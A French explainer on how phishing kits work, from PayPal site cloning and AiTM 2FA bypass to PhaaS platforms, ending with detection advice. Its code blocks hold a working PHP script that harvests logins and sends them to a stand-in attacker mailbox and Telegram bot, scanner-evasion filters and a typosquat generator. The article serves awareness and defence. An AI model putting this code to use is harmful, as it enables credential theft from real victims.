# Anatomie d'un phishing kit : comment fonctionnent les arnaques modernes

Les phishing kits sont des boîtes à outils clés en main qui permettent à n'importe qui, sans compétence technique, de monter une campagne de phishing sophistiquée en quelques minutes. Comprendre leur anatomie vous aide à les détecter et à vous en protéger.

## Qu'est-ce qu'un phishing kit ?

Un phishing kit est un **package complet** contenant tout le nécessaire pour imiter un site légitime et voler les identifiants des victimes. On les trouve sur les forums du dark web pour quelques dizaines à quelques centaines de dollars.

```
Contenu typique d'un phishing kit (.zip) :
phishing-kit-paypal/
├── index.php          ← Page de login imitant PayPal
├── verify.php         ← Étape 2FA simulée
├── process.php        ← Traitement des données volées
├── redirect.php       ← Redirection vers le vrai PayPal
├── assets/
│   ├── css/           ← Copie exacte du CSS PayPal
│   ├── js/            ← JavaScript de PayPal
│   └── img/           ← Logo, images, icônes
├── config.php         ← Email du "client" (attaquant)
└── logs/              ← Données volées stockées ici
```

## Comment un phishing kit fonctionne

### Étape 1 : Clonage du site légitime

```bash
# Outils de clonage automatique
httrack https://www.paypal.com -O ./paypal-clone    # HTTrack
wget --mirror --convert-links https://paypal.com    # Wget

# Les kits sophistiqués utilisent un reverse proxy
# qui affiche le vrai site en temps réel mais intercepte les credentials
```

### Étape 2 : Capture des données

```php
<?php
// Exemple simplifié de process.php dans un phishing kit

// Récupérer les données du formulaire
$email    = $_POST['email'];
$password = $_POST['password'];
$ip       = $_SERVER['REMOTE_ADDR'];
$datetime = date('Y-m-d H:i:s');
$browser  = $_SERVER['HTTP_USER_AGENT'];

// Collecter les données de la victime
$data = "=== Nouvelle victime ===\n";
$data .= "Date    : $datetime\n";
$data .= "IP      : $ip\n";
$data .= "Browser : $browser\n";
$data .= "Email   : $email\n";
$data .= "Password: $password\n";
$data .= "========================\n\n";

// Méthode 1 : Envoyer par email à l'attaquant
mail("attaquant@protonmail.com", "Nouvelle victime PayPal", $data);

// Méthode 2 : Sauvegarder dans un fichier log
file_put_contents("logs/credentials.txt", $data, FILE_APPEND);

// Méthode 3 : Envoyer via Telegram Bot (très courant en 2024)
$token = "BOT_TOKEN_TELEGRAM";
$chat_id = "ATTACKER_CHAT_ID";
$message = urlencode($data);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message");

// Rediriger vers le vrai site (la victime ne se doute de rien)
header("Location: https://www.paypal.com/signin");
exit();
?>
```

### Étape 3 : Phishing multi-étapes (MFA Bypass)

Les kits modernes contournent le 2FA en **relayant la session en temps réel** :

```
Attaque Adversary-in-the-Middle (AiTM) :

Victime → Faux site ← Attaquant → Vrai site
              ↓                        ↓
         Vol credentials          Session légitime
              +
         Récupération cookie de session
              ↓
         Réutilisation du cookie → Contourne le 2FA !
```

```python
# Evilginx2 - Framework AiTM (reverse proxy de phishing)
# Capture credentials ET session cookies
# Configuration pour une "phishlet" Office 365

# La victime voit exactement le vrai site Microsoft
# Evilginx intercepte TOUT en tant que proxy
# Incluant le cookie de session post-2FA

# Résultat : l'attaquant a un cookie valide qui bypass le 2FA
```

## Les techniques d'évasion

### Contournement des scanners anti-phishing

```php
<?php
// Techniques pour éviter la détection par les scanners

// 1. Bloquer les bots et scanners
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$blocked_agents = ['bot', 'crawler', 'spider', 'scanner', 'PhishTank', 'Google'];

foreach ($blocked_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        // Rediriger vers le vrai site → le scanner ne voit rien de malveillant
        header("Location: https://www.paypal.com");
        exit();
    }
}

// 2. Bloquer les IPs de sécurité connues
$ip = $_SERVER['REMOTE_ADDR'];
$blocked_ips = [
    '8.8.8.8',         // Google DNS
    '1.1.1.1',         // Cloudflare
    // Ranges des firewalls d'entreprises, Cisco Talos, etc.
];

if (in_array($ip, $blocked_ips)) {
    header("Location: https://www.paypal.com");
    exit();
}

// 3. Geo-filtering : seulement la cible géographique
$country = geoip_country_code_by_addr($ip);
if ($country != "FR") {  // Seulement la France
    header("Location: https://www.paypal.com");
    exit();
}

// 4. Time-based : actif seulement pendant quelques heures
$hour = date('H');
if ($hour < 8 || $hour > 20) {
    header("Location: https://www.paypal.com");
    exit();
}

// Passer ici = vraie victime potentielle
include 'phishing_page.html';
?>
```

### Typosquatting avancé

```python
# Génération automatique de domaines typosquattés
import itertools

def generate_typosquats(domain):
    base, tld = domain.rsplit('.', 1)
    typos = []

    # Substitution de caractères similaires
    char_subs = {
        'a': ['à', 'á', 'ä', '@'],
        'e': ['è', 'é', 'ë', '3'],
        'i': ['í', 'ï', '1', 'l'],
        'o': ['ó', 'ö', '0'],
        'l': ['1', 'I'],
    }

    # Ajout de mots courants
    prefixes = ['secure-', 'login-', 'account-', 'verify-', 'support-']
    suffixes = ['-secure', '-login', '-verify', '-update']

    for prefix in prefixes:
        typos.append(f"{prefix}{base}.{tld}")
    for suffix in suffixes:
        typos.append(f"{base}{suffix}.{tld}")

    # Homoglyphes Unicode
    typos.append("pаypal.com")  # 'а' cyrillique au lieu de 'a' latin
    typos.append("paypaI.com")  # 'I' majuscule au lieu de 'l' minuscule

    return typos

print(generate_typosquats("paypal.com"))
# ['secure-paypal.com', 'login-paypal.com', 'paypal-secure.com', ...]
```

## Les kits les plus sophistiqués en 2024

### EvilProxy et plateformes PhaaS

```
Phishing-as-a-Service (PhaaS) :
Les attaquants n'ont même plus besoin de configurer eux-mêmes

EvilProxy, Caffeine, Greatness, Robin Banks :
→ Interface web conviviale pour créer des campagnes
→ Bypass 2FA intégré (AiTM)
→ Tableau de bord des victimes en temps réel
→ Ciblage par pays, organisation, département
→ Modèles pour 100+ services (Microsoft 365, Google, LinkedIn...)
→ Prix : 200-500$/mois en abonnement

C'est pourquoi le phishing moderne est si efficace :
même les attaquants peu qualifiés ont accès à des outils professionnels
```

## Détection et protection

### Pour les utilisateurs

```
Comment détecter un phishing kit :

1. Vérifier l'URL EXACTE (pas juste le nom affiché)
   → secure-paypal.com ≠ paypal.com
   → paypaI.com (I majuscule) ≠ paypal.com

2. HTTPS ne garantit rien
   → Les phishing kits ont des certificats SSL valides
   → Let's Encrypt est gratuit et automatique

3. Vérifier si le 2FA est demandé TROP TÔT
   → Après avoir saisi le mot de passe, vrai site demande le 2FA
   → Phishing kit demande aussi le 2FA pour le capturer

4. Utiliser un gestionnaire de mots de passe
   → Bitwarden ne propose rien sur paypaI.com (domaine inconnu)
   → C'est un signal d'alarme automatique
```

### Pour les entreprises

```python
# Surveillance des typosquats avec DNSTwist
import subprocess

def surveiller_typosquats(domaine):
    # dnstwist génère et vérifie les typosquats en temps réel
    result = subprocess.run(
        ['dnstwist', '--registered', '--format', 'json', domaine],
        capture_output=True, text=True
    )
    # Résultats à intégrer dans votre threat intel
    return result.stdout

# Alertes automatiques sur les nouveaux domaines similaires
# Utiliser PhishTank, OpenPhish, urlscan.io pour la threat intel
```

## Conclusion

Les phishing kits modernes sont des outils professionnels, accessibles même aux attaquants sans compétence technique. La défense passe par l'éducation des utilisateurs, les gestionnaires de mots de passe (qui refusent de s'auto-remplir sur les faux sites), et les clés physiques FIDO2 qui sont totalement résistantes au phishing — même aux attaques AiTM.